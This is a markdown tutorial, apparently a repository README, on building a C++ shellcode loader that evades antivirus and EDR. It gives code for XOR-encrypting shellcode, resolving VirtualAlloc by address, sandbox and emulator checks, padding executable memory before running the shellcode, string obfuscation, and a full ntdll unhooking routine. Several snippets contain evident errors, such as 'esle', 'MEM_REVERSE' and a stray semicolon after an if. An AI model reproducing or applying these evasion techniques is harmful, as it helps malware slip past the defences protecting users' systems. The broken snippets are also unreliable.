# Countering antivirus roadmap

Below I will outline several ways to write a shellcode loader in memory and how to hide it from antivirus on C++.

1. [Shellcode encryption](#1)
2. [Using functions via address](#2)
3. [Result processing Windows API](#3)
4. [Сhecking the process name](#4)
5. [Сhecking mutex before launching](#5)
6. [Allocating a large amount of memory for shellcode](#6)
7. [Obfuscate strings](#7)
8. [DLL Unhooking](#8)

## <a name="1">Shellcode encryption </a>
The simplest and most important way to hide the load is shellcode encryption , this will help bypass static analysis of your file.
You can use both simple xor and more complex encryption methods such as rc4 , etc .

for example:

```
  const char key[]="somekey";
  const char shellcode[]="some shellcode";
  
  char coded[sizeof(shellcode)];
  
  for (int i=0,j=0; i<sizeof(shellcode); i++,j++){
    if (!(j<sizeof(key))) {
    j=0;
    }
    coded[i] = shellcode[i] ^ key[j];
  }
```

## <a name="2">Using functions via address</a>

You can use instead of a direct function call , a call through the address of this function in memory

for example:
```
  typedef LPVOID(__cdecl *MPROC)(LPVOID,SIZE_T,DWORD,DWORD;
  
  MPROC Alloc = (MPROC)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")),"VirtualAlloc");
  char *ex = (char*)Alloc(NULL,sizeof(shellcode),MEM_COMMIT,PAGE_EXECUTE-READWRITE);
```

## <a name="3">Result processing Windows API</a>

The antivirus emulator may not handle all Windows API functions and returns by default Null

for example:
```
  LPVOID res = NULL;
  res = VirtualAllocExNuma(GetCurrentProcess(), NULL, 100, MEM_REVERSE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);
  
  if (res != NULL )
  {
    //exec shellcode
  }
  return 0;
```
## <a name="4">Сhecking the process name</a>

Antivirus during the binary file check can run it not with the original name, to bypass dynamic checking, you can check the name of the file being run.

for example:
```
 int main ( int argc, char* argv[])
 {
  if (argv[0] == "my_name.exe")
  {
    //exec shellcode
  } 
  return 0;
 } 
```

## <a name="5">Сhecking mutex before launching</a>

You can start the program execution process only if a certain mutex is found in the system. If you try to create an existing mutex, the process throws an error.

for example:
```
 HANDLE mutex;
 mutex = CreateMutex( NULL, TRUE, "MY_MUTEX");
 
 if ( GetLastError() == ERROR_ALREADY_EXIST );
 {
  // exec shellcode
 }
 esle 
 {
  startExe("my_proc.exe");
  Sleep(1000);
 }
 return 0;
```

## <a name="6">Allocating a large amount of memory for shellcode</a>

With dynamic program analysis, antiviruses analyze the allocated memory, but they can analyze a certain amount of memory. you can allocate more memory than is necessary to write the silk code and write the first part, which will be analyzed by antivir with empty bytes.

for example:
```
 char *ex = VirtualAlloc(NULL, sizeof(shellcode)*2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 char *ex2 = ex + sizeof(shellcode);
 memcpy(ex2, shellcode, sizeof(shellcode));
 
 for( int i=0; i<=sizeof(shellcode)-1; i++)
 {
  ex[i] = 0x90;
 }
 
 ((void(*)())ex)();
```

## <a name="7">Obfuscate strings</a>

When plain text string literals are used in C++ programs, they will be compiled as-is into the resultant binary. This causes them to be incredibly easy to find. One can simply open up the binary file in a text editor to see all of the embedded string literals in plain view. A special utility called strings exists which can be used to search binary files for plain text strings.

You can use special strings obfuscators for example https://github.com/adamyaxley/Obfuscate

## <a name="8">DLL Unhooking</a>

It's possible to completely unhook any given DLL loaded in memory, by reading the .text section of ntdll.dll from disk and putting it on top of the .text section of the ntdll.dll that is mapped in memory. This may help in evading some EDR solutions that rely on userland API hooking.

for example:
```
#include "pch.h"
#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <psapi.h>

int main()
{
	HANDLE process = GetCurrentProcess();
	MODULEINFO mi = {};
	HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
	
	GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
	LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
	HANDLE ntdllFile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);

	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
		
		if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
			DWORD oldProtection = 0;
			bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
			memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
			isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
		}
	}
	
	CloseHandle(process);
	CloseHandle(ntdllFile);
	CloseHandle(ntdllMapping);
	FreeLibrary(ntdllModule);
	
	return 0;
}
```
